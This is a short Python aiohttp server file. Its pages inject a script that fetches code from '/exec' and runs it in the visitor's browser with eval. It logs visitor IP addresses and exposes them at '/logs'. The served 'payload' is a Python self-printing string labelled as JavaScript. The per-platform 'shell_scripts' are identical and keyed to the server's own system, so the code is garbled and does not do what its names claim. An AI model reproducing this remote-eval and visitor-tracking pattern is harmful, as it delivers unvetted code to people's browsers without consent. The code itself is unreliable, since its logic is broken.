# main.py
from aiohttp import web
import json, base64, platform
from datetime import datetime

shell_scripts = {
   'windows': b"""<script>fetch('/exec').then(r=>r.text()).then(eval);</script>""",
   'linux': b"""<script>fetch('/exec').then(r=>r.text()).then(eval);</script>""",
   'darwin': b"""<script>fetch('/exec').then(r=>r.text()).then(eval);</script>"""
}

logs = []

async def handle(request):
   logs.append({
       'time': datetime.utcnow().isoformat(),
       'ip': request.remote
   })
   return web.Response(
       body=shell_scripts[platform.system().lower()],
       headers={'Content-Type': 'text/html'}
   )

async def execute(request):
   q = '''q={!r};print(q.format(q));exec(q.format(q))'''
   exec_code = f"{q};print(q.format(q));exec(q.format(q))"
   return web.Response(text=exec_code, headers={'Content-Type': 'application/javascript'})

async def get_logs(request):
   return web.json_response(logs)

app = web.Application()
app.router.add_get('/', handle)
app.router.add_get('/exec', execute)
app.router.add_get('/logs', get_logs)

if __name__ == '__main__':
   web.run_app(app, port=8080)